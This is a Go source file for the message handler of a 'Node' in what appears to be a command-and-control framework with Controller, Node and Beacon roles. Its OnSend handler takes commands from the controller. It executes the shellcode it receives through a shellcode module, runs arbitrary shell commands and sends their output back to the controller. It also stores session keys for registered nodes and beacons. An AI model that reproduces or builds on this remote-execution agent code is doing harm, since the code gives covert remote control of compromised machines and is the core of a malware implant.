package node

import (
	"bytes"
	"context"
	"fmt"
	"sync"

	"github.com/davecgh/go-spew/spew"
	"github.com/vmihailenco/msgpack/v4"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/messages"
	"project/internal/module/shell"
	"project/internal/module/shellcode"
	"project/internal/protocol"
	"project/internal/xpanic"
)

type handler struct {
	ctx *Node

	context context.Context
	cancel  context.CancelFunc
	wg      sync.WaitGroup
}

func newHandler(ctx *Node) *handler {
	h := handler{
		ctx: ctx,
	}
	h.context, h.cancel = context.WithCancel(context.Background())
	return &h
}

func (h *handler) Cancel() {
	h.cancel()
}

func (h *handler) Close() {
	h.wg.Wait()
	h.ctx = nil
}

func (h *handler) logf(l logger.Level, format string, log ...interface{}) {
	h.ctx.logger.Printf(l, "handler", format, log...)
}

func (h *handler) log(l logger.Level, log ...interface{}) {
	h.ctx.logger.Println(l, "handler", log...)
}

// logfWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo logf
// spew output
//
// first log interface must be *protocol.Send or protocol.Broadcast
func (h *handler) logfWithInfo(l logger.Level, format string, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintf(buf, format, log[1:]...)
	buf.WriteString("\n")
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(l, "handler", buf)
}

// logWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo log
// spew output
//
// first log interface must be *protocol.Send or protocol.Broadcast
func (h *handler) logWithInfo(l logger.Level, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintln(buf, log[1:]...)
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(l, "handler", buf)
}

// logPanic must use like defer h.logPanic("title")
func (h *handler) logPanic(title string) {
	if r := recover(); r != nil {
		err := xpanic.Error(r, title)
		h.log(logger.Fatal, err)
	}
}

// -------------------------------------------send---------------------------------------------------

func (h *handler) OnSend(send *protocol.Send) {
	defer h.logPanic("handler.OnSend")
	if len(send.Message) < 4 {
		const log = "controller send with invalid size"
		h.logWithInfo(logger.Exploit, send, log)
		return
	}
	msgType := convert.BytesToUint32(send.Message[:4])
	send.Message = send.Message[4:]
	switch msgType {
	case messages.CMDExecuteShellCode:
		h.handleExecuteShellCode(send)
	case messages.CMDShell:
		h.handleShell(send)
	case messages.CMDTest:
		h.handleSendTestMessage(send)
	default:
		const format = "controller send unknown message\ntype: 0x%08X\n%s"
		h.logf(logger.Exploit, format, msgType, spew.Sdump(send))
	}
}

// TODO <security> must remove to Beacon
func (h *handler) handleExecuteShellCode(send *protocol.Send) {
	defer h.logPanic("handler.handleExecuteShellCode")
	var es messages.ExecuteShellCode
	err := msgpack.Unmarshal(send.Message, &es)
	if err != nil {
		const log = "controller send invalid shellcode"
		h.logWithInfo(logger.Exploit, send, log)
		return
	}
	go func() {
		// add interrupt to execute wg.Done
		err = shellcode.Execute(es.Method, es.ShellCode)
		if err != nil {
			// send execute error
			fmt.Println("--------------", err)
		}
	}()
}

// TODO <security> must remove to Beacon
func (h *handler) handleShell(send *protocol.Send) {
	defer h.logPanic("handler.handleShell")
	var s messages.Shell
	err := msgpack.Unmarshal(send.Message, &s)
	if err != nil {
		const log = "controller send invalid shell"
		h.logWithInfo(logger.Exploit, send, log)
		return
	}
	go func() {
		// add interrupt to execute wg.Done
		output, err := shell.Shell(s.Command)
		if err != nil {
			// send execute error
			return
		}

		so := messages.ShellOutput{
			Output: output,
		}
		err = h.ctx.sender.Send(messages.CMDBShellOutput, &so)
		if err != nil {
			fmt.Println("failed to send:", err)
		}
	}()
}

func (h *handler) handleSendTestMessage(send *protocol.Send) {
	defer h.logPanic("handler.handleSendTestMessage")
	if !h.ctx.Test.testMsgEnabled {
		return
	}
	err := h.ctx.Test.AddSendTestMessage(h.context, send.Message)
	if err != nil {
		const log = "failed to add send test message\nerror:"
		h.logWithInfo(logger.Fatal, send, log, err)
	}
}

// ----------------------------------------broadcast-------------------------------------------------

func (h *handler) OnBroadcast(broadcast *protocol.Broadcast) {
	defer h.logPanic("handler.OnBroadcast")
	if len(broadcast.Message) < 4 {
		const log = "controller broadcast with invalid size"
		h.logWithInfo(logger.Exploit, broadcast, log)
		return
	}
	msgType := convert.BytesToUint32(broadcast.Message[:4])
	broadcast.Message = broadcast.Message[4:]
	switch msgType {
	case messages.CMDNodeRegisterResponse:
		h.handleNodeRegisterResponse(broadcast)
	case messages.CMDBeaconRegisterResponse:
		h.handleBeaconRegisterResponse(broadcast)
	case messages.CMDTest:
		h.handleBroadcastTestMessage(broadcast)
	default:
		const format = "controller broadcast unknown message\ntype: 0x%08X\n%s"
		h.logf(logger.Exploit, format, msgType, spew.Sdump(broadcast))
	}
}

func (h *handler) handleNodeRegisterResponse(broadcast *protocol.Broadcast) {
	defer h.logPanic("handler.handleNodeRegisterResponse")
	nrr := new(messages.NodeRegisterResponse)
	err := msgpack.Unmarshal(broadcast.Message, nrr)
	if err != nil {
		const log = "controller broadcast invalid node register response"
		h.logWithInfo(logger.Exploit, broadcast, log)
		return
	}
	h.ctx.storage.AddNodeSessionKey(nrr.GUID, &nodeSessionKey{
		PublicKey:    nrr.PublicKey,
		KexPublicKey: nrr.KexPublicKey,
		AckTime:      nrr.ReplyTime,
	})
	h.ctx.storage.SetNodeRegister(nrr.GUID, nrr)
}

func (h *handler) handleBeaconRegisterResponse(broadcast *protocol.Broadcast) {
	defer h.logPanic("handler.handleBeaconRegisterResponse")
	brr := new(messages.BeaconRegisterResponse)
	err := msgpack.Unmarshal(broadcast.Message, brr)
	if err != nil {
		const log = "controller broadcast invalid beacon register response"
		h.logWithInfo(logger.Exploit, broadcast, log)
		return
	}
	h.ctx.storage.AddBeaconSessionKey(brr.GUID, &beaconSessionKey{
		PublicKey:    brr.PublicKey,
		KexPublicKey: brr.KexPublicKey,
		AckTime:      brr.ReplyTime,
	})
	h.ctx.storage.SetBeaconRegister(brr.GUID, brr)
}

func (h *handler) handleBroadcastTestMessage(broadcast *protocol.Broadcast) {
	defer h.logPanic("handler.handleBroadcastTestMessage")
	if !h.ctx.Test.testMsgEnabled {
		return
	}
	err := h.ctx.Test.AddBroadcastTestMessage(h.context, broadcast.Message)
	if err != nil {
		const log = "failed to add broadcast test message\nerror:"
		h.logWithInfo(logger.Fatal, broadcast, log, err)
	}
}
